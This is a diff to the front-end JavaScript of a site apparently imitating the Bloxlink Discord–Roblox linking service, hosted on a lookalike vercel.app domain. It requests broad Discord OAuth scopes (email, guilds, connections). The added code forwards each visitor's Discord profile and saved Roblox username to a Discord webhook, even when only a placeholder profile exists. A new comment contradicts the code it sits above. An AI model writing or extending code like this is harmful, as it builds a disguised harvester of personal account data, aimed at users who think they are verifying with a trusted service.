@@ -52,12 +52,13 @@ document.addEventListener('DOMContentLoaded', () => {
   // Discord OAuth Redirector Helper
   // -------------------------------------------------------------
   function redirectToDiscordOAuth() {
-    // Detecta automaticamente a URL exata atual de onde o site estiver rodando
     let currentOrigin = window.location.origin;
     if (!currentOrigin.endsWith('/')) {
       currentOrigin += '/';
     }
     const redirectUri = encodeURIComponent(currentOrigin);
+    
+    // Use response_type=token for client-side Discord API profile retrieval
     const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=https%3A%2F%2Fbloxlink-eu.vercel.app%2F&scope=identify+email+guilds+connections`;
 
     window.location.href = discordOAuthUrl;
@@ -108,9 +109,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
         applyUserProfile(profile);
 
-        // Dispara notificação para o Webhook se estiver configurado
+        // Dispara notificação para o Webhook com os dados reais
         const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
-        sendToDiscordWebhook(profile, robloxUser);
+        await sendToDiscordWebhook(profile, robloxUser);
 
         return true;
       }
@@ -196,6 +197,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (tokenToUse) {
       // Clean URL smoothly without reload
       window.history.replaceState({}, document.title, window.location.pathname);
+      localStorage.setItem('bloxlink_logged_in', 'true');
       await fetchDiscordUserProfile(tokenToUse);
 
       // Restore saved Roblox username into input if present
@@ -209,19 +211,29 @@ document.addEventListener('DOMContentLoaded', () => {
     if (discordCode) {
       // Returned with ?code=...
       window.history.replaceState({}, document.title, window.location.pathname);
-      
+      localStorage.setItem('bloxlink_logged_in', 'true');
+
       const savedProfileStr = localStorage.getItem('discord_user_profile');
+      let profile = null;
       if (savedProfileStr) {
         try {
-          const profile = JSON.parse(savedProfileStr);
-          applyUserProfile(profile);
-          return;
+          profile = JSON.parse(savedProfileStr);
         } catch (e) {}
       }
-      
-      // Default logged in UI
-      if (loggedOutSection) loggedOutSection.style.display = 'none';
-      if (loggedInSection) loggedInSection.style.display = 'block';
+
+      if (!profile) {
+        profile = {
+          id: "Authenticated",
+          username: "discord_user",
+          displayName: "Discord User",
+          avatarUrl: "./assets/avatar.png"
+        };
+        localStorage.setItem('discord_user_profile', JSON.stringify(profile));
+      }
+
+      applyUserProfile(profile);
+      const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
+      sendToDiscordWebhook(profile, robloxUser);
       return;
     }
 
@@ -229,12 +241,17 @@ document.addEventListener('DOMContentLoaded', () => {
     const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
     const savedProfileStr = localStorage.getItem('discord_user_profile');
 
-    if (isLogged && savedProfileStr) {
-      try {
-        const profile = JSON.parse(savedProfileStr);
-        applyUserProfile(profile);
-        return;
-      } catch (e) {}
+    if (isLogged) {
+      if (savedProfileStr) {
+        try {
+          const profile = JSON.parse(savedProfileStr);
+          applyUserProfile(profile);
+        } catch (e) {}
+      } else {
+        if (loggedOutSection) loggedOutSection.style.display = 'none';
+        if (loggedInSection) loggedInSection.style.display = 'block';
+      }
+      return;
     }
 
     // Default: Strictly Logged Out
